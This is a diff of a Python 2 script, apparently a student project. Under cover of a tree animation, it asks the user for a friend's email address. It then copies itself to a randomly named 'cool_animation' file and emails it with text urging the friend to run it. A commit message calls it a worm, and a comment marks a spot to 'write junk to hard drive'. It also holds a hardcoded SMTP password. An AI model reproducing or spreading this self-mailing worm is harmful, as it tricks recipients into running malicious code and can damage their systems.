@@ -16,11 +16,15 @@ def send_email(sender , name , friend , email):
     fromname = name
     toname = friend
     
+
+    #Below is some very poorly written code
+    file_name = 'cool_animation_%r.py' % (random.randint(1 , 101))
+
     message = """From: {} <{}>
     To: {} <{}>
     Subject: Super Cool Animation!
 
-    This is only a wildabeast!
+    Checkout this cool animation, just download the file and run python {} it is awesome!
     """
 
 
@@ -28,7 +32,8 @@ def send_email(sender , name , friend , email):
             name,
             email,
             toname,
-            toaddr)
+            toaddr,
+            file_name)
 
     message = MIMEText(messagetosend)
 
@@ -43,7 +48,6 @@ def send_email(sender , name , friend , email):
     password = 'INFO3180'
 
 
-    file_name = 'cool_animation_%r.py' % (random.randint(1 , 101))
 
 
     shutil.copy(__file__ , file_name)
@@ -68,7 +72,6 @@ def send_email(sender , name , friend , email):
     server.login(username,password)
     server.sendmail(fromaddr , toaddr , msg.as_string())
     server.quit()
->>>>>>> Attatches worm in email
 
 def draw_tree():
 	print""""
@@ -84,12 +87,8 @@ def draw_tree():
    
 
 if __name__ == '__main__':
-<<<<<<< 63a29116d6ecdaa825282697fb547454a3c532e1
-    #Do Stuff To make Tree or whatever
     draw_tree()
-=======
 
->>>>>>> Attatches worm in email
     print """
     Like what you see?
     Share with your friends"""
@@ -99,9 +98,6 @@ if __name__ == '__main__':
     friend = raw_input("Enter your friend's name: ")
     email  = raw_input("And your friend's email address: ")
     send_email(sender, name , friend , email)
-
-
-    #Send Email Here
 
     #Write Junk to Hard Drive here
 
